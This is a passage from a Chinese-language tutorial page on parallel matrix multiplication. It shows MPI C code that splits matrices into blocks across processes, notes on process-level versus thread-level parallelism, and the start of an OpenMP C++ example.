   <span class="kt">double</span> <span class="n">start</span><span class="p">,</span> <span class="n">stop</span><span class="p">;</span> <span class="c1">//计时时间</span>
   <span class="n">MPI_Status</span> <span class="n">status</span><span class="p">;</span>
 
   <span class="n">MPI_Init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">argc</span><span class="p">,</span><span class="o">&amp;</span><span class="n">argv</span><span class="p">);</span>
   <span class="n">MPI_Comm_size</span><span class="p">(</span><span class="n">MPI_COMM_WORLD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">comm_sz</span><span class="p">);</span>
   <span class="n">MPI_Comm_rank</span><span class="p">(</span><span class="n">MPI_COMM_WORLD</span><span class="p">,</span><span class="o">&amp;</span><span class="n">rank</span><span class="p">);</span>
 
   <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">sqrt</span><span class="p">(</span><span class="n">comm_sz</span><span class="p">);</span> <span class="c1">// A B行列分多少块</span>
 
   <span class="kt">int</span> <span class="n">saveM</span><span class="o">=</span><span class="n">M</span><span class="p">,</span><span class="n">saveN</span><span class="o">=</span><span class="n">N</span><span class="p">,</span><span class="n">saveK</span><span class="o">=</span><span class="n">K</span><span class="p">;</span> <span class="c1">// 为了A B能均分成块</span>

   <span class="kt">int</span> <span class="n">each_M</span><span class="o">=</span><span class="n">M</span><span class="o">/</span><span class="n">a</span><span class="p">,</span><span class="n">each_N</span><span class="o">=</span><span class="n">N</span><span class="o">/</span><span class="n">a</span><span class="p">,</span><span class="n">each_K</span><span class="o">=</span><span class="n">K</span><span class="o">/</span><span class="n">a</span><span class="p">;</span> <span class="c1">// 矩阵A B每块分多少行列数据</span>
 
   <span class="k">if</span><span class="p">(</span><span class="n">rank</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
      <span class="kt">double</span> <span class="o">*</span><span class="n">Matrix_A</span><span class="p">,</span><span class="o">*</span><span class="n">Matrix_B</span><span class="p">,</span><span class="o">*</span><span class="n">Matrix_C</span><span class="p">,</span><span class="o">*</span><span class="n">result_Matrix</span><span class="p">;</span>
      <span class="n">Matrix_A</span><span class="o">=</span><span class="p">(</span><span class="kt">double</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">M</span><span class="o">*</span><span class="n">N</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">double</span><span class="p">));</span>
      <span class="n">Matrix_B</span><span class="o">=</span><span class="p">(</span><span class="kt">double</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">N</span><span class="o">*</span><span class="n">K</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">double</span><span class="p">));</span>
      <span class="n">Matrix_C</span><span class="o">=</span><span class="p">(</span><span class="kt">double</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">M</span><span class="o">*</span><span class="n">K</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">double</span><span class="p">));</span>
      <span class="n">result_Matrix</span><span class="o">=</span><span class="p">(</span><span class="kt">double</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">M</span><span class="o">*</span><span class="n">K</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">double</span><span class="p">));</span> <span class="c1">// 保存数据计算结果</span>
 
      <span class="n">init_Matrix</span><span class="p">(</span><span class="n">Matrix_A</span><span class="p">,</span><span class="n">Matrix_B</span><span class="p">,</span><span class="n">Matrix_C</span><span class="p">,</span><span class="n">M</span><span class="p">,</span><span class="n">N</span><span class="p">,</span><span class="n">K</span><span class="p">,</span><span class="n">saveM</span><span class="p">,</span><span class="n">saveN</span><span class="p">,</span><span class="n">saveK</span><span class="p">);</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"a=%d each_M=%d each_N=%d each_K=%d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">a</span><span class="p">,</span><span class="n">each_M</span><span class="p">,</span><span class="n">each_N</span><span class="p">,</span><span class="n">each_K</span><span class="p">);</span>
 
      <span class="n">start</span><span class="o">=</span><span class="n">MPI_Wtime</span><span class="p">();</span>
      <span class="c1">// 主进程计算第1块</span>
      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">each_M</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
         <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">each_K</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">){</span>
            <span class="kt">double</span> <span class="n">temp</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">p</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">p</span><span class="o">&lt;</span><span class="n">N</span><span class="p">;</span><span class="n">p</span><span class="o">++</span><span class="p">){</span>
               <span class="n">temp</span><span class="o">+=</span><span class="n">Matrix_A</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="n">N</span><span class="o">+</span><span class="n">p</span><span class="p">]</span><span class="o">*</span><span class="n">Matrix_B</span><span class="p">[</span><span class="n">p</span><span class="o">*</span><span class="n">K</span><span class="o">+</span><span class="n">j</span><span class="p">];</span>
            <span class="p">}</span>
            <span class="n">result_Matrix</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="n">K</span><span class="o">+</span><span class="n">j</span><span class="p">]</span><span class="o">=</span> <span class="n">temp</span><span class="o">+</span> <span class="n">Matrix_C</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="n">K</span><span class="o">+</span><span class="n">j</span><span class="p">];</span>
         <span class="p">}</span>
      <span class="p">}</span>
 
      <span class="c1">// 向其它进程发送块数据</span>
      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">comm_sz</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
         <span class="kt">int</span> <span class="n">beginRow</span><span class="o">=</span><span class="p">(</span><span class="n">i</span><span class="o">/</span><span class="n">a</span><span class="p">)</span><span class="o">*</span><span class="n">each_M</span><span class="p">;</span> <span class="c1">// 每个块的行列起始位置(坐标/偏移量)</span>
         <span class="kt">int</span> <span class="n">beginCol</span><span class="o">=</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="n">a</span><span class="p">)</span><span class="o">*</span><span class="n">each_K</span><span class="p">;</span>
         <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">each_M</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">)</span>
            <span class="n">MPI_Send</span><span class="p">(</span><span class="n">Matrix_C</span><span class="o">+</span><span class="p">(</span><span class="n">beginRow</span><span class="o">+</span><span class="n">j</span><span class="p">)</span><span class="o">*</span><span class="n">K</span><span class="o">+</span><span class="n">beginCol</span><span class="p">,</span><span class="n">each_K</span><span class="p">,</span><span class="n">MPI_DOUBLE</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="o">+</span><span class="n">each_M</span><span class="o">+</span><span class="n">each_N</span><span class="p">,</span><span class="n">MPI_COMM_WORLD</span><span class="p">);</span>
         <span class="c1">// 发送A B每块数据</span>
         <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">k</span><span class="o">&lt;</span><span class="n">a</span><span class="p">;</span><span class="n">k</span><span class="o">++</span><span class="p">){</span>
            <span class="kt">int</span> <span class="n">begin_part</span><span class="o">=</span><span class="n">k</span><span class="o">*</span><span class="n">each_N</span><span class="p">;</span> <span class="c1">// 移动A的列 B的行 即A列不同程度的左移，B行不同程度的上移</span>
            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">each_M</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">)</span>
               <span class="n">MPI_Send</span><span class="p">(</span><span class="n">Matrix_A</span><span class="o">+</span><span class="p">(</span><span class="n">beginRow</span><span class="o">+</span><span class="n">j</span><span class="p">)</span><span class="o">*</span><span class="n">N</span><span class="o">+</span><span class="n">begin_part</span><span class="p">,</span><span class="n">each_N</span><span class="p">,</span><span class="n">MPI_DOUBLE</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">,</span><span class="n">MPI_COMM_WORLD</span><span class="p">);</span>
            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">p</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">p</span><span class="o">&lt;</span><span class="n">each_N</span><span class="p">;</span><span class="n">p</span><span class="o">++</span><span class="p">)</span>
               <span class="n">MPI_Send</span><span class="p">(</span><span class="n">Matrix_B</span><span class="o">+</span><span class="p">(</span><span class="n">begin_part</span><span class="o">+</span><span class="n">p</span><span class="p">)</span><span class="o">*</span><span class="n">K</span><span class="o">+</span><span class="n">beginCol</span><span class="p">,</span><span class="n">each_K</span><span class="p">,</span><span class="n">MPI_DOUBLE</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">p</span><span class="o">+</span><span class="n">each_M</span><span class="p">,</span><span class="n">MPI_COMM_WORLD</span><span class="p">);</span>
         <span class="p">}</span>
      <span class="p">}</span>
      <span class="c1">// 接收从进程的计算结果</span>
      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">comm_sz</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
         <span class="kt">int</span> <span class="n">beginRow</span><span class="o">=</span><span class="p">(</span><span class="n">i</span><span class="o">/</span><span class="n">a</span><span class="p">)</span><span class="o">*</span><span class="n">each_M</span><span class="p">;</span>
         <span class="kt">int</span> <span class="n">endRow</span><span class="o">=</span><span class="n">beginRow</span><span class="o">+</span><span class="n">each_M</span><span class="p">;</span>
         <span class="kt">int</span> <span class="n">beginCol</span><span class="o">=</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="n">a</span><span class="p">)</span><span class="o">*</span><span class="n">each_K</span><span class="p">;</span>
         <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="n">beginRow</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">endRow</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">)</span>
            <span class="n">MPI_Recv</span><span class="p">(</span><span class="n">result_Matrix</span><span class="o">+</span><span class="n">j</span><span class="o">*</span><span class="n">K</span><span class="o">+</span><span class="n">beginCol</span><span class="p">,</span><span class="n">each_K</span><span class="p">,</span><span class="n">MPI_DOUBLE</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="o">-</span><span class="n">beginRow</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="n">each_M</span><span class="o">+</span><span class="n">each_N</span><span class="p">,</span><span class="n">MPI_COMM_WORLD</span><span class="p">,</span><span class="o">&amp;</span><span class="n">status</span><span class="p">);</span>
      <span class="p">}</span>
 
      <span class="n">Matrix_print2</span><span class="p">(</span><span class="n">result_Matrix</span><span class="p">,</span><span class="n">saveM</span><span class="p">,</span><span class="n">saveK</span><span class="p">,</span><span class="n">K</span><span class="p">);</span>
      <span class="n">stop</span><span class="o">=</span><span class="n">MPI_Wtime</span><span class="p">();</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"rank:%d time:%lfs</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">rank</span><span class="p">,</span><span class="n">stop</span><span class="o">-</span><span class="n">start</span><span class="p">);</span>
 
      <span class="n">free</span><span class="p">(</span><span class="n">Matrix_A</span><span class="p">);</span>
      <span class="n">free</span><span class="p">(</span><span class="n">Matrix_B</span><span class="p">);</span>
      <span class="n">free</span><span class="p">(</span><span class="n">Matrix_C</span><span class="p">);</span>
      <span class="n">free</span><span class="p">(</span><span class="n">result_Matrix</span><span class="p">);</span>
   <span class="p">}</span>
   <span class="k">else</span> <span class="p">{</span>
      <span class="kt">double</span> <span class="o">*</span><span class="n">buffer_A</span><span class="p">,</span><span class="o">*</span><span class="n">buffer_B</span><span class="p">,</span><span class="o">*</span><span class="n">buffer_C</span><span class="p">;</span>
      <span class="n">buffer_A</span><span class="o">=</span><span class="p">(</span><span class="kt">double</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">each_M</span><span class="o">*</span><span class="n">each_N</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">double</span><span class="p">));</span> <span class="c1">// A的均分行的数据</span>
      <span class="n">buffer_B</span><span class="o">=</span><span class="p">(</span><span class="kt">double</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">each_N</span><span class="o">*</span><span class="n">each_K</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">double</span><span class="p">));</span> <span class="c1">// B的均分列的数据</span>
      <span class="n">buffer_C</span><span class="o">=</span><span class="p">(</span><span class="kt">double</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">each_M</span><span class="o">*</span><span class="n">each_K</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">double</span><span class="p">));</span> <span class="c1">// C的均分行的数据</span>
 
      <span class="c1">// 接收C块数据</span>
      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">each_M</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">)</span>
         <span class="n">MPI_Recv</span><span class="p">(</span><span class="n">buffer_C</span><span class="o">+</span><span class="n">j</span><span class="o">*</span><span class="n">each_K</span><span class="p">,</span><span class="n">each_K</span><span class="p">,</span><span class="n">MPI_DOUBLE</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">j</span><span class="o">+</span><span class="n">each_M</span><span class="o">+</span><span class="n">each_N</span><span class="p">,</span><span class="n">MPI_COMM_WORLD</span><span class="p">,</span><span class="o">&amp;</span><span class="n">status</span><span class="p">);</span>
 
      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">k</span><span class="o">&lt;</span><span class="n">a</span><span class="p">;</span><span class="n">k</span><span class="o">++</span><span class="p">){</span> <span class="c1">// 把每块数据求和</span>
         <span class="c1">//接收A B块数据</span>
         <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">each_M</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">)</span>
            <span class="n">MPI_Recv</span><span class="p">(</span><span class="n">buffer_A</span><span class="o">+</span><span class="n">j</span><span class="o">*</span><span class="n">each_N</span><span class="p">,</span><span class="n">each_N</span><span class="p">,</span><span class="n">MPI_DOUBLE</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">j</span><span class="p">,</span><span class="n">MPI_COMM_WORLD</span><span class="p">,</span><span class="o">&amp;</span><span class="n">status</span><span class="p">);</span>
         <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">p</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">p</span><span class="o">&lt;</span><span class="n">each_N</span><span class="p">;</span><span class="n">p</span><span class="o">++</span><span class="p">)</span>
            <span class="n">MPI_Recv</span><span class="p">(</span><span class="n">buffer_B</span><span class="o">+</span><span class="n">p</span><span class="o">*</span><span class="n">each_K</span><span class="p">,</span><span class="n">each_K</span><span class="p">,</span><span class="n">MPI_DOUBLE</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">p</span><span class="o">+</span><span class="n">each_M</span><span class="p">,</span><span class="n">MPI_COMM_WORLD</span><span class="p">,</span><span class="o">&amp;</span><span class="n">status</span><span class="p">);</span>
 
         <span class="c1">//计算乘积结果,并将结果发送给主进程</span>
         <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">each_M</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">each_K</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">){</span>
               <span class="kt">double</span> <span class="n">temp</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
               <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">p</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">p</span><span class="o">&lt;</span><span class="n">each_N</span><span class="p">;</span><span class="n">p</span><span class="o">++</span><span class="p">){</span>
                  <span class="n">temp</span><span class="o">+=</span><span class="n">buffer_A</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="n">each_N</span><span class="o">+</span><span class="n">p</span><span class="p">]</span><span class="o">*</span><span class="n">buffer_B</span><span class="p">[</span><span class="n">p</span><span class="o">*</span><span class="n">each_K</span><span class="o">+</span><span class="n">j</span><span class="p">];</span>
               <span class="p">}</span>
               <span class="k">if</span><span class="p">(</span><span class="n">k</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span>
                  <span class="n">buffer_C</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="n">each_K</span><span class="o">+</span><span class="n">j</span><span class="p">]</span><span class="o">=</span> <span class="n">temp</span><span class="o">+</span> <span class="n">buffer_C</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="n">each_K</span><span class="o">+</span><span class="n">j</span><span class="p">];</span>
               <span class="k">else</span>
                  <span class="n">buffer_C</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="n">each_K</span><span class="o">+</span><span class="n">j</span><span class="p">]</span><span class="o">+=</span> <span class="n">temp</span><span class="p">;</span>
            <span class="p">}</span>
         <span class="p">}</span>
      <span class="p">}</span>
      <span class="c1">// 将结果发送给主进程</span>
      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">j</span><span class="o">&lt;</span><span class="n">each_M</span><span class="p">;</span><span class="n">j</span><span class="o">++</span><span class="p">){</span>
         <span class="n">MPI_Send</span><span class="p">(</span><span class="n">buffer_C</span><span class="o">+</span><span class="n">j</span><span class="o">*</span><span class="n">each_K</span><span class="p">,</span><span class="n">each_K</span><span class="p">,</span><span class="n">MPI_DOUBLE</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">j</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="n">each_M</span><span class="o">+</span><span class="n">each_N</span><span class="p">,</span><span class="n">MPI_COMM_WORLD</span><span class="p">);</span>
      <span class="p">}</span>
 
      <span class="n">free</span><span class="p">(</span><span class="n">buffer_A</span><span class="p">);</span>
      <span class="n">free</span><span class="p">(</span><span class="n">buffer_B</span><span class="p">);</span>
      <span class="n">free</span><span class="p">(</span><span class="n">buffer_C</span><span class="p">);</span>
   <span class="p">}</span>
   <span class="n">MPI_Finalize</span><span class="p">();</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="由于进程有独立的内存空间维护进程空间需要消耗一定资源其次由于内存互不重叠进程之间的消息必须显式地传递和接收相较于单一机器使用mpi更适合计算机集群中使用">   由于进程有独立的内存空间，维护进程空间需要消耗一定资源。其次，由于内存互不重叠，进程之间的消息必须显式地传递和接收。相较于单一机器使用，MPI更适合计算机集群中使用。</h5> <h3 id="线程级别并行">线程级别并行</h3> <h5 id="在上述分布式并行中提及了由于基于消息传递优化的卡农算法而对于单一机器多核处理器来说实际上没有必要将计算单元的数据相互隔离对应地也就是没有必要为每个运算单元维护进程在一个进程中使用多个线程即可由于线程间共享内存也就避免了复杂地消息传播">   在上述分布式并行中，提及了由于基于消息传递优化的卡农算法，而对于单一机器多核处理器来说，实际上没有必要将计算单元的数据相互隔离。对应地，也就是没有必要为每个运算单元维护进程，在一个进程中使用多个线程即可，由于线程间共享内存，也就避免了复杂地消息传播.</h5> <h4 id="共享内存并行">共享内存并行</h4> <h5 id="基于上述的理念提出了基于多线程的共享内存并行具体到编程时可以使用手动管理posix线程-也可以使用openmpopen-multiple-processing-添加预编译命令完成">   基于上述的理念，提出了基于多线程的共享内存并行。具体到编程时，可以使用<pthread.h>手动管理POSIX线程, 也可以使用OpenMP(Open Multiple processing), 添加预编译命令完成</pthread.h></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;cstring&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;omp.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
</span>
<span class="k">const</span> <span class="kt">int</span> <span class="n">N</span> <span class="o">=</span> <span class="mi">64</span><span class="p">;</span>
<span class="kt">float</span> <span class="n">NormalMul</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">N</span><span class="p">];</span>
<span class="kt">float</span> <span class="n">MPMul</span><span class="p">[</span><span class="n">N</span><span class="p">][</span><span class="n">N</span><span class="p">];</span>

<span class="kt">void</span> <span class="nf">check</span><span class="p">(){</span>
    <span class="c1">// 检查使用，输出前16个元素并对比</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">NormalMul</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">i</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="sc">' '</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">MPMul</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="n">i</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="sc">' '</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>

<span class="p">}</span>

<span class="kt">void</span> <span class="nf">MulNormal</span><span class="p">(</span><span class="kt">float</span> <span class="o">**</span><span class="n">A</span><span class="p">,</span> <span class="kt">float</span> <span class="o">**</span><span class="n">B</span><span class="p">){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">){</span>
            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span><span class="p">){</span>
                <span class="n">NormalMul</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">+=</span> <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">*</span> <span class="n">B</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span><span class="p">];</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">MulMP</span><span class="p">(</span><span class="kt">float</span> <span class="o">**</span><span class="n">A</span><span class="p">,</span> <span class="kt">float</span> <span class="o">**</span><span class="n">B</span><span class="p">){</span>
    <span class="c1">// 在此处添加预编译命令</span>
    <span class="cp">#pragma omp parallel for num_threads(4) schedule(dynamic)
</span>    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">){</span>
            <span class="kt">float</span> <span class="n">temp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">k</span><span class="p">){</span>
                <span class="n">temp</span> <span class="o">+=</span> <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">k</span><span class="p">]</span> <span class="o">*</span> <span class="n">B</span><span class="p">[</span><span class="n">k</span><span class="p">][</span><span class="n">j</span><span class="p">];</span>
            <span class="p">}</span>
            <span class="n">MPMul</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">temp</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="kt">float</span><span class="o">**</span> <span class="nf">randMatrix</span><span class="p">(){</span>
    <span class="n">srand</span><span class="p">(</span><span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">&gt;</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="n">nullptr</span><span class="p">)));</span>
    <span class="kt">float</span> <span class="o">**</span><span class="n">Matrix</span> <span class="o">=</span> <span class="p">(</span><span class="kt">float</span><span class="o">**</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">N</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="o">*</span><span class="p">));</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="n">Matrix</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">float</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">float</span><span class="p">)</span> <span class="o">*</span> <span class="n">N</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">N</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">){</span>
            <span class="n">Matrix</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">float</span><span class="o">&gt;</span><span class="p">(</span><span class="n">rand</span><span class="p">())</span> <span class="o">/</span> <span class="n">static_cast</span><span class="o">&lt;</span><span class="kt">float</span><span class="o">&gt;</span><span class="p">(</span><span class="n">RAND_MAX</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
